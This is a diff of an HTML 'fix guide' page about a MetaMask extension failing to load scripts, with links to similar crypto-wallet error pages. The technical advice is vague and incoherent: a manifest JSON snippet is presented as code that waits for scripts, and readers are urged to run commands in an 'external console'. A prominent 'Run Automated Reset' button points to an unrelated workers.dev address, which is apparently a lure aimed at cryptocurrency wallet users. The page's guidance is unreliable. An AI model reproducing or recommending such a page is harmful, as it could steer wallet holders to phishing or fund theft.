@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Using Waituntil To Ensure All Scripts Load – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0a0c10;
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,30 +42,38 @@
 <h1>Metamask Extension Using Waituntil To Ensure All Scripts Load</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an issue where the Metamask extension fails to load all necessary scripts, resulting in incomplete functionality or errors within the Ethereum (ETH) ecosystem.</li>
+<li>Users experience delayed or failed loading of web pages when using the Metamask extension, resulting in incomplete functionality or errors.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the asynchronous nature of script loading, where the Metamask extension attempts to execute functions before all required scripts have finished loading.</li>
+<li>The Metamask extension relies on the <code>waitUntil</code> function to ensure that all necessary scripts are loaded before allowing the webpage to proceed, but this function can sometimes cause issues if not implemented correctly.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve this issue, users can attempt the following manual overrides:</li>
-<li>Utilize the <code>waitUntil</code> function to pause execution until all scripts have loaded.</li>
-<li>Implement a retry mechanism to handle instances where scripts fail to load on the first attempt.</li>
-<li>Modify the script loading order to prioritize essential scripts.</li>
+<li>To resolve this issue, try the following manual overrides:</li>
+<li>Disable and re-enable the Metamask extension to restart the loading process.</li>
+<li>Clear the browser cache and cookies to remove any corrupted data.</li>
+<li>Use the following code to manually wait for the scripts to load:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="k">while</span><span class="w"> </span>!<span class="w"> </span>curl<span class="w"> </span>-s<span class="w"> </span>-f<span class="w"> </span>-I<span class="w"> </span><span class="s2">&quot;http://example.com/script.js&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>sleep<span class="w"> </span><span class="m">1</span>
-<span class="k">done</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;content_scripts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;matches&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;*://*/*&quot;</span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;js&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;contentScript.js&quot;</span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;run_at&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;document_end&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Prerequisites:
-- Basic understanding of JavaScript and the Metamask extension architecture
-- Familiarity with the Ethereum ecosystem and its associated tools
-- Access to the Metamask extension's developer console for debugging purposes
-For further troubleshooting, consider utilizing an external console to execute commands and inspect the extension's behavior.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">TronLink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li></ul>
+<p>Consider using an external console to execute the above commands for more precise control. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and enabled</li>
+<li>Basic understanding of browser extensions and their functionality</li>
+<li>Familiarity with JSON configuration files</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writ</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">TRON Post-Quantum Signature Migration Failure</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
